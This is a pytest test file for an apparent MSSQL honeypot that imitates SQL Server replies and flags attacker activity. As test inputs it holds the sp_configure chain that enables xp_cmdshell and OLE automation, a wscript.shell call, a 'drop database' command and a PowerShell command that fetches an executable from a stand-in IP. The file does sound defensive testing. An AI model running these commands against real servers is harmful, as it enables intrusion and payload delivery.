from __future__ import annotations

import time

import pytest

from mssql_sensor import sql, tds
from mssql_sensor.identity import Profile, derive_profile


@pytest.fixture(scope="module")
def prof() -> Profile:
    return derive_profile("cd" * 32, "15.0.4375.4")


def run(prof: Profile, text: str, state: sql.SqlState | None = None) -> list[tds.Statement]:
    return sql.respond(state or sql.SqlState(), text, prof)


def test_version_banner(prof: Profile) -> None:
    st = run(prof, "SELECT @@VERSION")[0]
    banner = str(st.rows[0][0])
    assert banner.startswith("Microsoft SQL Server 2019 (RTM-CU27)") and "15.0.4375.4" in banner
    assert "honeypot" not in banner.lower()


def test_scalars_in_order(prof: Profile) -> None:
    st = run(prof, "select system_user, db_name(), is_srvrolemember('sysadmin')")[0]
    assert st.rows == [["sa", "master", 1]]


def test_serverproperty(prof: Profile) -> None:
    st = run(prof, "SELECT SERVERPROPERTY('ProductVersion'), SERVERPROPERTY('Edition')")[0]
    assert st.rows == [["15.0.4375.4", "Standard Edition (64-bit)"]]


def test_sys_databases_and_tables(prof: Profile) -> None:
    names = [r[0] for r in run(prof, "select name from sys.databases")[0].rows]
    assert names[:4] == ["master", "tempdb", "model", "msdb"] and len(names) == 6
    st = run(prof, "select * from sys.databases")[0]
    assert len(st.columns) == 4
    assert run(prof, "select count(*) from sys.databases")[0].rows == [[6]]


def test_use_and_fake_table(prof: Profile) -> None:
    state = sql.SqlState()
    app = prof.databases[0]
    out = run(prof, f"use [{app}]; select * from users", state)
    assert state.db == app
    assert any(isinstance(m, tds.Env) for m in out[0].messages)
    assert len(out[1].rows) == 12 and out[1].rows[0][1] == "admin"
    assert run(prof, "use nosuchdb", state)[0].failed
    err = run(prof, "select * from nosuchtable", state)[0]
    assert err.failed and err.messages[0].number == 208  # type: ignore[union-attr]


def test_xp_cmdshell_chain(prof: Profile) -> None:
    state = sql.SqlState()
    blocked = run(prof, "exec xp_cmdshell 'whoami'", state)[0]
    assert blocked.failed and blocked.messages[0].number == 15281  # type: ignore[union-attr]
    adv = run(prof, "exec sp_configure 'xp_cmdshell', 1", state)[0]
    assert adv.failed and adv.messages[0].number == 15123  # type: ignore[union-attr]
    out = run(
        prof,
        "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; "
        "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE",
        state,
    )
    assert [type(m).__name__ for s in out for m in s.messages] == ["Msg", "Msg"]
    assert state.running["xp_cmdshell"] == 1
    res = run(prof, "exec master..xp_cmdshell 'whoami'", state)[0]
    assert res.rows == [["nt service\\mssqlserver"], [None]]


def test_no_separator_batch(prof: Profile) -> None:
    state = sql.SqlState()
    run(
        prof,
        "exec sp_configure 'show advanced options',1 reconfigure exec sp_configure 'xp_cmdshell',1 reconfigure",
        state,
    )
    assert state.running["xp_cmdshell"] == 1


def test_ole_blocked_then_enabled(prof: Profile) -> None:
    state = sql.SqlState()
    blocked = run(prof, "declare @o int exec sp_OACreate 'wscript.shell', @o out", state)
    assert blocked[-1].failed
    run(
        prof,
        "exec sp_configure 'show advanced options',1; reconfigure; exec sp_configure 'Ole Automation Procedures',1; reconfigure",
        state,
    )
    ok = run(prof, "exec sp_oacreate 'wscript.shell', @o out", state)
    assert not ok[0].failed


def test_generic_replies(prof: Profile) -> None:
    assert run(prof, "exec nosuchproc 1")[0].messages[0].number == 2812  # type: ignore[union-attr]
    assert run(prof, "insert into users values (1)")[0].count == 1
    assert not run(prof, "drop database appdb")[0].failed
    assert run(prof, "gibberish here")[0].messages[0].number == 102  # type: ignore[union-attr]
    assert run(prof, "")[0].messages == []


def test_hashes_are_not_fixed(prof: Profile) -> None:
    other = derive_profile("ef" * 32, "15.0.4375.4")
    q = "select name, password_hash from sys.sql_logins"
    assert run(prof, q)[0].rows[0][1] != run(other, q)[0].rows[0][1]


def test_flags_and_downloads() -> None:
    f = sql.analyze(
        "exec xp_cmdshell 'powershell -c iwr http://198.51.100.9/a.exe -o a.exe'; "
        "exec sp_configure 'Ole Automation Procedures',1; drop database x"
    )
    assert {
        "xp_cmdshell",
        "sp_configure",
        "ole_automation",
        "shell_command",
        "drop_database",
        "download",
    } <= f.flags
    assert f.downloads and f.downloads[0].url.startswith("http://198.51.100.9/")
    assert (
        "ransom_note"
        in sql.analyze("insert into readme values ('send bitcoin to recover your data')").flags
    )


def test_statement_count_and_size_are_bounded(prof: Profile) -> None:
    out = run(prof, "select 1;" * 5000)
    assert len(out) == sql.MAX_STATEMENTS
    body = tds.encode_statements(out, 0x74000004, "SRV-SQL01")
    assert len(body) < 4096


def test_fast_on_pathological_input(prof: Profile) -> None:
    texts = [
        "select " + "(" * 20000,
        "'" * 30000,
        "exec " + "a." * 9000,
        "select * from " + "[" * 20000,
        " ".join(["exec", "select"] * 6000),
        "serverproperty(" * 2000,
        "\x00" * 60000,
    ]
    start = time.perf_counter()
    for text in texts:
        sql.respond(sql.SqlState(), text, prof)
        sql.analyze(text)
    assert time.perf_counter() - start < 1.5
